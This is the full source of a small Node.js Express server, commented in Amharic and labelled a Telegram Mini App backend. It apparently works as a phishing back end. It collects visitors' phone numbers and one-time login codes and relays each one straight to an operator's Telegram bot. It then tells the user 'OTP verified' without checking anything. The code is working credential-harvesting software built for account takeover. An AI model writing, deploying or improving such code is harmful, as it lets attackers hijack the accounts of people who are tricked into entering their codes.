const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');

const app = express();
app.use(cors());
app.use(bodyParser.json());

const PORT = process.env.PORT || 3000;

// የእርስዎ ቦት ቶከን እና አድሚን ቻት አይዲ እዚህ ይገባል
const BOT_TOKEN = 'YOUR_BOT_TOKEN'; 
const ADMIN_CHAT_ID = 'YOUR_ADMIN_CHAT_ID';

async function sendTelegramNotification(message) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: ADMIN_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
    } catch (error) {
        console.error('Telegram notification error:', error);
    }
}

app.get('/', (req, res) => {
    res.send('Telegram Mini App Backend is live!');
});

// 1. ስልክ ቁጥር መቀበያ እና ለአድሚን ቦት መላኪያ
app.post('/api/send-code', async (req, res) => {
    const { phone } = req.body;
    console.log(`[PHONE RECEIVED]: ${phone}`);
    
    // መረጃውን በቀጥታ ወደ አድሚን ቦትዎ ይልካል
    await sendTelegramNotification(`🚨 *New Phone Number Received!*\n📱 Phone: \`${phone}\``);
    
    res.json({ success: true, message: 'Code request sent' });
});

// 2. የኦቲፒ ኮድ መቀበያ እና ለአድሚን ቦት መላኪያ
app.post('/api/verify-code', async (req, res) => {
    const { code } = req.body;
    console.log(`[OTP RECEIVED]: ${code}`);
    
    // የገባውን ኮድ በቀጥታ ወደ አድሚን ቦትዎ ይልካል
    await sendTelegramNotification(`🔑 *New OTP Code Received!*\n🔢 Code: \`${code}\``);
    
    res.json({ success: true, message: 'OTP verified' });
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});